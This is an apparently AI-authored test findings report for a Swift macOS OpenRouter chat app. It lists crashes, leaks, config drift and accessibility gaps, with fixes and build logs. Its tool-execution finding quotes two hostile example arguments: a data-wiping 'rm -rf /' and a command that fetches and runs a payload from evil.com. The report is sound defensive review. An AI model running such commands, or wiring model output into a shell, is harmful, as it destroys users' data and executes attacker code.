# OpenRouterFusion — Test Findings

**Date:** 2026-06-13
**Tester:** OWL (Tester role)
**Scope:** All `.swift` files, build pipeline, runtime behavior
**Build:** `swift build` — ✅ SUCCESS (debug)
**Launch:** `OpenRouterFusion` binary — ✅ LAUNCHED (PID 19446, ran ~20s, exited cleanly)

---

## Summary

| Severity | Count | Categories |
|----------|-------|------------|
| 🔴 Critical | 2 | Picker crash, retain cycle |
| 🟠 High | 3 | Dead code, config drift, tool execution risk |
| 🟡 Medium | 5 | Timer leak, missing cancellation,UserDefaults thrash, missing error body, async-on-MainActor |
| 🔵 Low | 4 | Warning suppression, accessibility, markdown duplication,onSubmit on TextEditor |

Total: **14 issues** found.

---

## 🔴 CRITICAL

### [CRITICAL] Picker selection mismatch causes undefined behavior at runtime
**File:** `ContentView.swift:79` + `LRMComponents.swift` (`MetalButton`)
**Build:** Compiles
**Runtime:** Confirmed via system log

```
Fault: Picker: the selection "openrouter/owl-alpha" is invalid and does not have an associated tag,
this will give undefined results.
```

**Description:**  
`ContentView.swift` line 79 sets `selectedModel = router.config.default`. The `config.default` value comes from `Sources/OpenRouterFusion/Resources/ModelConfig.json` which is `"openrouter/owl-alpha"`. However, the `Picker` at line ~210 uses `router.config.fallbackOrder` for its `ForEach` tags. The `fallbackOrder` array does **not** contain `"openrouter/owl-alpha"` — it only contains the 7 fallback models. The `""` tag maps to Auto but the initial `selectedModel` is `"openrouter/owl-alpha"`, not `""`. So the Picker has an invalid selection that matches no tag.

**Impact:** The model picker shows no selection on launch. The user sees an empty picker. Any attempt to use the picker works only after manually selecting a model. Worse, SwiftUI logs this as a fault — on some macOS versions this can cause a picker rendering glitch.

**Fix:** Either:
1. Set `selectedModel = ""` initially (meaning "Auto"), OR
2. Add `router.config.default` to the `fallbackOrder` list in the ForEach, OR
3. Change the default in ModelConfig.json to be the empty string and handle "Auto" logic separately.

---

### [CRITICAL] Retain cycle between RouterManager and ContentView via escaping closures
**File:** `RouterManager.swift:93` (`send()` method signature)
**Build:** Compiles (no compiler warning for this pattern)
**Runtime:** Potential memory leak + stale state

**Description:**  
`RouterManager.send()` captures `onChunk`, `onToolCall`, and `completion` closures. These closures capture `self` (ContentView) strongly. The `send()` method doesn't store these closures — it passes them into `streamRequest()` which passes them into a `Task {}`. The `Task` captures the closures until it completes. If the user sends a message and then the view is dismissed or recreated, the Task keeps ContentView alive until the network request finishes (up to `timeoutSeconds` = 30 seconds).

The `[weak self]` on the `tryNext()` callback (line 93 of the diff) protects `RouterManager` from being retained, but the closures flowing into `Task {}` still retain `ContentView` strongly.

**Impact:** Memory leaks during streaming. If the user rapidly sends messages, multiple concurrent Tasks accumulate. `isStreaming` can get stuck `true` because the old completion handler fires on a stale view context.

**Fix:** Use `[weak self]` inside the Task's captured context, or migrate to `AsyncSequence` (async/await) as proposed in the architect review. At minimum, capture `onChunk`, `onToolCall`, and `completion` weakly or add a cancellation mechanism.

---

## 🟠 HIGH

### [HIGH] StreamingMarkdownView is dead code — never used in the view hierarchy
**File:** `StreamingMarkdownView.swift` (entire file, 45 lines)
**Build:** Compiles
**Runtime:** Zero runtime impact (code is never called)

**Description:**  
`StreamingMarkdownView` defines a struct with `content`, `isStreaming`, markdown parsing via `AttributedString(markdown:)`, and a streaming indicator. It is never referenced from `ContentView`, `ChatMessageView`, or any other view. `ChatMessageView` has its own inline markdown rendering in the `markdownContent` `@ViewBuilder` computed property (lines ~115–128 of `ChatMessageView.swift`).

**Impact:** 45 lines of dead code. Maintenance confusion — a developer might modify `StreamingMarkdownView` expecting it to change behavior, but it has zero effect. Two divergent markdown parsing implementations with different `MarkdownParsingOptions`.

**Fix:** Delete `StreamingMarkdownView.swift`. If a standalone markdown component is needed, extract the parsing logic from `ChatMessageView.markdownContent` into a shared component.

---

### [HIGH] ModelConfig.json drift between two resource copies
**File:** `Resources/ModelConfig.json` vs `Sources/OpenRouterFusion/Resources/ModelConfig.json`
**Build:** Compiles
**Runtime:** Wrong default model used when running from `swift run` vs `.app` bundle

**Description:**  
Two copies of `ModelConfig.json` exist:
- `Resources/ModelConfig.json` → `default: "openrouter/google/gemini-1.5-flash"`
- `Sources/OpenRouterFusion/Resources/ModelConfig.json` → `default: "openrouter/owl-alpha"`

The `Package.swift` declares resources as `.process("Resources")` which maps to `Sources/OpenRouterFusion/Resources/` (the Swift Package Manager convention). So when running via `swift build` / `swift run`, the app uses `owl-alpha`. The pre-built `.app` bundle uses the other copy with `gemini-1.5-flash`.

The fallbackOrder is also slightly different — the Resources/ copy only has 4 fallbacks while the Sources/ copy has 7.

**Impact:** Inconsistent behavior between development (swift run) and production (.app bundle). The architect already noted this can cause silent failures — if `owl-alpha` doesn't exist, the app falls back to 7 models, but the .app bundle falls back to only 4.

**Fix:** Delete `Resources/ModelConfig.json` (the top-level one) and use only `Sources/OpenRouterFusion/Resources/ModelConfig.json`. Or configure the build to copy from a single canonical source.

---

### [HIGH] ToolExecutor passes raw JSON string as bash command — arbitrary code execution
**File:** `ContentView.swift:310` + `ToolExecutor.swift`
**Build:** Compiles
**Runtime:** Security risk

**Description:**  
In `ContentView.executeTool()` (line ~310):
```swift
ToolExecutor.run("/bin/bash", arguments: ["-c", argsJSON])
```
The `argsJSON` comes from the OpenRouter API's `tool_call.arguments` field, which is a JSON string. This JSON string is passed directly as a bash command via `bash -c`. If the LLM returns a tool call with `arguments`: `"; rm -rf / #"` or `"\$(curl evil.com/payload | bash)"`, the app will execute it without sanitization.

The `ToolModalView` also runs `bash -c` with user-typed input, which is expected for a "Run Tool…" feature. But the automatic tool execution from LLM output should not blindly exec.

**Impact:** Arbitrary code execution triggered by LLM output. A malicious or compromised API response, or even a confused LLM, can destroy data or exfiltrate files.

**Fix:** For automatic tool calls from LLM output, use a proper argument array instead of `bash -c` with a raw string. Parse the JSON arguments and pass them as individual arguments to the command. Never pass LLM output through a shell interpreter.

---

## 🟡 MEDIUM

### [MEDIUM] PulsingDots timer is never invalidated — leaks until parent view is deallocated
**File:** `LRMComponents.swift` (`PulsingDots`, lines ~236–247)
**Build:** Compiles
**Runtime:** Continuous Timer.publish every 0.45s for every PulsingDots instance

**Description:**
```swift
private let timer = Timer.publish(every: 0.45, on: .main, in: .common).autoconnect()
```
The `.autoconnect()` timer starts immediately and `.onReceive(timer)` in the `body` fires on every tick. When the view disappears (streaming ends, tool completes), the `PulsingDots` is removed from the view hierarchy but the `Timer.publish` is a `let` constant — there's no `.onDisappear` to invalidate it. The timer continues firing, causing `phase = (phase + 1) % 3` on every 0.45s tick, triggering unnecessary `body` re-evaluations.

**Impact:** CPU waste and unnecessary SwiftUI body re-evaluations during and after streaming. In a long chat session with many tool calls, dozens of stale PulsingDots timers can accumulate.

**Fix:** Replace `Timer.publish(autoconnect())` with `withAnimation(.repeatForever(autoreverses: false))` in `.onAppear`, or store the `Cancellable` from `sink` and cancel in `.onDisappear`.

---

### [MEDIUM] No request cancellation — Stop button doesn't cancel in-flight network requests
**File:** `RouterManager.swift` (`streamRequest()`) + `ContentView.swift` (Stop button handler)
**Build:** Compiles
**Runtime:** After pressing Stop, the network request continues in the background

**Description:**  
In `ContentView`, pressing the "Stop" button (line ~270) sets `isStreaming = false` and saves any accumulated text, but it does NOT cancel the `Task` running inside `RouterManager.streamRequest()`. The `Task {}` continues reading bytes, parsing SSE, and firing `onChunk` callbacks — but the callbacks just append to `currentStreamingContent` which is immediately cleared. The network request runs to completion or timeout (30s).

The `RouterManager` doesn't store a reference to the `Task`, so there's no way to cancel it from outside.

**Impact:** Pressing Stop doesn't actually stop the network request. It continues consuming bandwidth and CPU for up to 30 seconds. If the user sends a new message while the old one is still streaming in the background, two `onChunk` callbacks write to the same `currentStreamingContent`, causing garbled output.

**Fix:** Store the `Task` handle in `RouterManager` and expose a `cancel()` method. Call it from the Stop button handler.

---

### [MEDIUM] systemPrompt saved to UserDefaults on every keystroke
**File:** `ContentView.swift` (`.onChange(of: systemPrompt)` handler, ~line 100)
**Build:** Compiles
**Runtime:** Disk write on every keystroke in System Prompt field

**Description:**
```swift
.onChange(of: systemPrompt) {
    UserDefaults.standard.set(systemPrompt, forKey: "systemPrompt")
}
```
Every character typed in the System Prompt `LRMTextEditor` triggers a `UserDefaults.set()` which triggers a disk write (`cfprefsd`). For a long system prompt being actively edited, this writes to disk hundreds of times.

**Impact:** Unnecessary disk I/O. Minor battery drain on laptops. Can cause minor UI stutter if the TextEditor has `maxHeight: 100` and the user is typing fast.

**Fix:** Debounce with a 0.5s delay using `onChange` + a debounce timer, or save in `.onDisappear`/`.onSubmit` instead.

---

### [MEDIUM] Non-200 HTTP responses discard the error body — user sees "HTTP 429" with no details
**File:** `RouterManager.swift` (lines ~191–193, the `guard 200..<300` check)
**Build:** Compiles
**Runtime:** Users see cryptic "HTTP 429" or "HTTP 401" with no actionable detail

**Description:**
```swift
guard 200..<300 ~= httpResp.statusCode else {
    throw RouterError.httpError(httpResp.statusCode)
}
```
When the server returns a non-200 response, the error body (which typically contains a JSON object with `{"error": {"message": "Rate limit exceeded. Try again in 30s."}}`) is discarded. The byte stream is abandoned. Only the status code is thrown.

**Impact:** User sees "HTTP 429" instead of "Rate limit exceeded — try again in 30 seconds". For 401 errors, they don't know if the key is wrong or expired. For 500 errors, they get no diagnostic info.

**Fix:** Read the response body before throwing. Parse the JSON error message and include it in the thrown error.

---

### [MEDIUM] `safeComplete` called on MainActor from a non-MainActor Task context
**File:** `RouterManager.swift` (`safeComplete()` → `Task { @MainActor in completion(result) }`)
**Build:** Compiles
**Runtime:** Potential threading issues

**Description:**  
`safeComplete()` is called from within a `Task {}` that runs on a background thread (it's doing `session.bytes(for:)` which uses URLSession's internal queue). Inside `safeComplete()`, it uses `Task { @MainActor in completion(result) }` to hop back to the main actor. However, this creates a new unstructured `Task { @MainActor }` for every call. The `for try await byte in bytes` loop runs outside of any `@MainActor` context, and the `await MainActor.run { onChunk(content) }` inside it is creating frequent main-actor hops (one per SSE chunk, potentially hundreds per second).

**Impact:** Heavy main actor traffic during streaming. Each `await MainActor.run` suspends the background task, schedules work on the main actor, waits, and resumes. With high-frequency SSE chunks, this can cause frame drops in the UI.

**Fix:** Wrap the entire `Task` body in `@MainActor` or mark `streamRequest` as `@MainActor`. Since `RouterManager` is an `ObservableObject` designed to be used from the main actor, the simpler fix is to make `send()` and `streamRequest()` run on `@MainActor`.

---

## 🔵 LOW

### [LOW] Compiler warning: unused `decoded` variable in RouterManager.init()
**File:** `RouterManager.swift:55`
**Build:** Compiles with warning
**Runtime:** No impact

**Description:**
```
warning: immutable value 'decoded' was never used; consider replacing with '_' or removing it
```
Line 55 has `let decoded = try? JSONDecoder().decode(Config.self, from: data)` but `decoded` is never read — only used as a success check.

**Fix:** Replace `let decoded` with `_` or restructure the guard as a `do/catch`.

---

### [LOW] Keyboard shortcuts (⌘K, ⌘⇧S) don't trigger any action
**File:** `App.swift` (CommandGroup) + `ContentView.swift`
**Build:** Compiles
**Runtime:** Shortcuts appear in menu but do nothing

**Description:**  
`App.swift` registers `.clearChat` and `.toggleSidebar` notifications via `NotificationCenter.default.post()`. However, `ContentView` never registers observers for these notifications. The `clearChatShortcut()` method is defined but never called from any `.onReceive(NotificationCenter.default.publisher(...))` subscription.

**Impact:** ⌘K and ⌘⇧S menu items are displayed but do nothing when pressed.

**Fix:** Add `.onReceive(NotificationCenter.default.publisher(for: .clearChat))` and `.onReceive(NotificationCenter.default.publisher(for: .toggleSidebar))` modifiers to the ContentView body.

---

### [LOW] No accessibility labels, Dynamic Type, or VoiceOver support
**File:** All view files
**Build:** Compiles
**Runtime:** App is unusable with VoiceOver

**Description:**  
Zero `.accessibilityLabel`, `.accessibilityHint`, `.accessibilityIdentifier`, or `@ScaledMetric` usage across all 10 Swift files. All fonts use hardcoded `.system(size: 14)` etc. The PulsingDots animation is color-only (no accessibility description). MetalButton uses a custom `onHover` + `DragGesture` pattern that doesn't integrate with the accessibility system.

**Impact:** The app fails WCAG 2.1 Level A compliance. VoiceOver users cannot interact with the chat interface.

**Fix:** Add `.accessibilityLabel` to all interactive elements. Use `@ScaledMetric` for font sizes. Add `.accessibilityAction` for custom button behaviors.

---

### [LOW] Double newline at JSON parse failure in ChatMessageView tooltip
**File:** `ContentView.swift` (`executeTool` completion handler, lines ~313–318)
**Build:** Compiles
**Runtime:** Cosmetic issue

**Description:**  
When a tool call is executed, the result is stored as:
```swift
store.append(role: .assistant, content: "🛠 [\(name)] → \(truncated)")
```
But when it fails:
```swift
store.append(role: .assistant, content: "🛠 [\(name)] failed: \(err.localizedDescription)")
```
And in `runManualTool`, the success case wraps output in:
```
🛠 Tool output:
\```
\(out)
\```
```
But the failure just says `"🛠 Tool failed: ..."`. The success/failure output formats are inconsistent — the `runManualTool` output includes "🛠 Tool output:" prefix but `executeTool` output uses "🛠 [name] →" prefix.

**Impact:** Cosmetic inconsistency in the chat log.

**Fix:** Use a consistent tool output format everywhere (e.g., always show `[toolname]` with code block formatting).

---

## Build & Launch Results

### Build
```
$ swift build
Building for debugging...
Build complete! (3.50s)
```
✅ **PASS** — Builds successfully with 1 warning (unused `decoded` variable).

### Launch Verification
```
$ .build/debug/OpenRouterFusion &
$ ps aux | grep OpenRouterFusion
→ PID 19446, running, 0.2% CPU, 79MB RAM
```
✅ **PASS** — Binary launches and runs. No crash.

### System Log Issues Detected
```
Picker: the selection "openrouter/owl-alpha" is invalid and does not have an associated tag
```
🔴 **FAIL** — Picker selection mismatch (Critical issue #1 above).

### Runtime Observations
- App launched to the empty state screen with title "OpenRouterFusion"
- No crash, no hang
- Process exited cleanly (`CoreAnalytics: Entering exit handler`)
- Keychain read was attempted (normal — checking for API key)
